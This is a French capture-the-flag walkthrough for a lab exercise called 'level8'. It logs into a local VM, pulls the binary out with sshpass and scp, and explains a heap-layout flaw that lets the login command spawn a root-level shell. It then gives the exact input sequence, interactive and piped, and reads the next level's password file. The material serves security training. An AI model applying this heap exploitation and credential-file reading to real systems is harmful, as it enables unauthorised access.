# Level8 — Commandes

## Connexion

```bash
ssh level8@localhost -p 4242
```

Mot de passe : (dans `level7/flag`)

---

## Recon

```bash
pwd
ls -la
file level8
readelf -h level8
```

Extraction (depuis l’hôte, dans `level8/`) :  
`sshpass -p '<level8_password>' scp -o StrictHostKeyChecking=no -P 4242 level8@localhost:level8 ./level8.bin`

Voir `analysis.md`.

---

## Exploitation

Le programme lit des commandes : **auth**, **reset**, **service**, **login**. **login** appelle **system("/bin/sh")** si ***(auth+0x20) != 0**. Le bloc **auth** ne fait que 4 octets ; la condition lit donc dans le heap après auth. En envoyant **service** avec une longue chaîne, l’allocation **strdup** peut être juste après auth, et **auth+0x20** tombe dans ce buffer → mettre un octet non nul à cet endroit.

### Méthode 1 : interactif (recommandé)

Lancer le binaire, puis **taper** les lignes suivantes (ce ne sont pas des commandes shell) :

```bash
./level8
```

À l’invite (affichage des adresses), taper successivement :

```
auth AAAA
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
login
```

Si besoin, mettre plus de 'A' après **service** (32, 40…). Au **login**, un shell s’ouvre → `cat /home/user/level9/.pass`.

### Méthode 2 : en pipe

Les trois lignes doivent être envoyées **au programme** (entrée standard), pas exécutées par le shell :

```bash
printf 'auth AAAA\nservice AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nlogin\n' | ./level8
```

Puis garder stdin ouvert pour le shell : `( printf 'auth AAAA\nservice AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nlogin\n'; cat ) | ./level8`, puis taper `cat /home/user/level9/.pass`.

Récupération du mot de passe level9 : `cat /home/user/level9/.pass`, noter dans `level8/flag`.
